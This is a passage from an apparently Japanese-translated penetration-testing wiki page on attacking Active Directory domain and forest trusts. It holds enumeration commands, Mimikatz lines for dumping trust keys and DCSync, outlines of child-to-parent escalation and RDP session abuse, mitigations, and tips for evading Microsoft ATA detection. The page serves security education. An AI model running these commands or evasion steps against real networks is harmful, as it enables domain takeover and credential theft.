- **Foreign Domain Group Membership**: プリンシパルが外部ドメイン内のグループのメンバになることもあります。ただし、この方法の有効性はトラストの性質やグループのスコープに依存します。
- **Access Control Lists (ACLs)**: プリンシパルが**ACL**に、特に**DACL**内の**ACE**のエンティティとして指定されている場合、特定のリソースへのアクセスを持ちます。ACL、DACL、ACEの仕組みを深く掘り下げたい場合は、白書「An ACE Up The Sleeve」が非常に参考になります: https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf

### Find external users/groups with permissions

外部のセキュリティプリンシパルを見つけるには、**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認できます。これらは**外部ドメイン／フォレスト**からのuser/groupです。

これを**Bloodhound**で確認するか、powerviewを使って確認できます:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子フォレストから親フォレストへの権限昇格
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメインの信頼関係を列挙する他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 信頼鍵が**2つ**あります。1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されているものは、次のコマンドで確認できます：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

信頼を悪用して、SID-History injection により child/parent ドメインへ Enterprise admin として昇格します：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) がどのように悪用され得るかを理解することは重要です。Configuration NC は Active Directory (AD) 環境内のフォレスト全体に関する構成データの中央リポジトリとして機能します。このデータはフォレスト内のすべての Domain Controller (DC) にレプリケートされ、writable DC は Configuration NC の書き込み可能なコピーを保持します。これを悪用するには、DC 上での **SYSTEM** 権限（できれば child DC）が必要です。

**Link GPO to root DC site**

Configuration NC の Sites コンテナには、AD フォレスト内のすべてのドメイン参加コンピュータのサイト情報が含まれます。任意の DC 上で SYSTEM 権限を行使することで、攻撃者は GPO を root DC site にリンクできます。この操作により、これらのサイトに適用されるポリシーを操作して root domain を危険にさらす可能性があります。

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

攻撃ベクターとしてドメイン内の特権 gMSA を標的にすることがあります。gMSA のパスワード計算に必要な KDS Root key は Configuration NC に保存されています。任意の DC 上で SYSTEM 権限を持てば、KDS Root key にアクセスしてフォレスト内の任意の gMSA のパスワードを算出することが可能です。

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

この手法は忍耐を要し、新しい特権 AD オブジェクトの作成を待つ必要があります。SYSTEM 権限があれば、攻撃者は AD Schema を変更して任意のユーザに全クラスの完全なコントロールを与えることができます。これにより、新しく作成された AD オブジェクトに対する不正アクセスや制御が可能になります。

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 の脆弱性は、PKI オブジェクトを制御してフォレスト内の任意のユーザとしての認証を可能にする証明書テンプレートを作成することを狙います。PKI オブジェクトは Configuration NC に存在するため、書き込み可能な child DC を侵害することで ESC5 攻撃を実行できます。

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### 外部フォレストドメイン - 一方向（Inbound）または双方向
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインが外部ドメインによって信頼されており**、外部ドメインに対して**不明確な権限**が与えられています。あなたは、**自ドメインのどのプリンシパルが外部ドメインに対してどのアクセス権を持っているか**を特定し、それを利用して攻撃を試みる必要があります:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（アウトバウンド）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは **あなたのドメイン** が **異なるドメイン** のプリンシパルに対していくつかの **特権** を **信頼** しています。

しかし、**ドメインが信頼される** と、trusted domain は **予測可能な名前** を持つ **ユーザーを作成し**、その **パスワード** としてその信頼されたパスワードを使用します。つまり、**trusting domain のユーザーにアクセスして trusted domain 内に侵入**し、列挙や権限昇格を試みることが可能であるということです:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain を侵害する別の方法は、ドメイントラストの **逆方向** に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはそれほど一般的ではありません）。

trusted domain を侵害する別の方法は、**trusted domain のユーザーが RDP でログインできる** マシン上で待ち伏せすることです。そうすれば、攻撃者は RDP セッションプロセスにコードを注入し、そこから **被害者のオリジンドメインにアクセス** することができます。\
さらに、**被害者がハードドライブをマウントしていた** 場合、RDP セッションプロセスからハードドライブの **startup folder** に **backdoors** を置くことも可能です。この手法は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイントラスト悪用の緩和策

### **SID Filtering:**

- フォレスト間トラストで SID history 属性を悪用する攻撃のリスクは、すべてのフォレスト間トラストでデフォルトで有効になっている SID Filtering によって軽減されます。これは Microsoft の見解に基づき、セキュリティ境界をドメインではなくフォレストと見なすことを前提としています。
- ただし注意点として、SID filtering はアプリケーションやユーザーのアクセスを阻害する可能性があり、そのため一時的に無効化されることがあります。

### **Selective Authentication:**

- フォレスト間トラストにおいて、Selective Authentication を採用すると、2 つのフォレストのユーザーが自動的に認証されることはなくなります。代わりに、trusting domain/forest 内のドメインやサーバーにアクセスするためには明示的な権限が必要になります。
- これらの対策は、writable Configuration Naming Context (NC) の悪用や trust account に対する攻撃を防ぐものではない点に留意する必要があります。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins は Domain Controllers へのログオンのみを許可し、他のホストでの使用を避けることが推奨されます。
- **Service Account Privileges**: サービスはセキュリティのために Domain Admin (DA) 権限で実行すべきではありません。
- **Temporal Privilege Limitation**: DA 権限が必要なタスクについては、その期間を制限することが推奨されます。例: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Deception の実装は、パスワードが期限切れにならない、あるいは Trusted for Delegation にマークされたデコイユーザーやコンピュータのようなトラップを設定することを含みます。具体的には、特定の権利を持つユーザーを作成したり、高権限グループに追加したりする方法があります。
- 実際の例: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception 技術の展開については [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **Identifying Deception**

- **For User Objects**: 異常な ObjectSID、ログオン頻度の低さ、作成日時、低い bad password カウントなどが疑わしい指標になります。
- **General Indicators**: 潜在的なデコイオブジェクトの属性を正規のものと比較することで不整合を発見できます。HoneypotBuster のようなツールが識別に役立ちます（[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)）。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 検出を回避するために Domain Controllers 上でのセッション列挙を避ける。
- **Ticket Impersonation**: チケット作成に **aes** キーを利用することで NTLM にフォールバックさせずに検出を免れるのに役立ちます。
- **DCSync Attacks**: Domain Controller から直接実行するとアラートが発生するため、非 Domain Controller から実行することが推奨されます。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
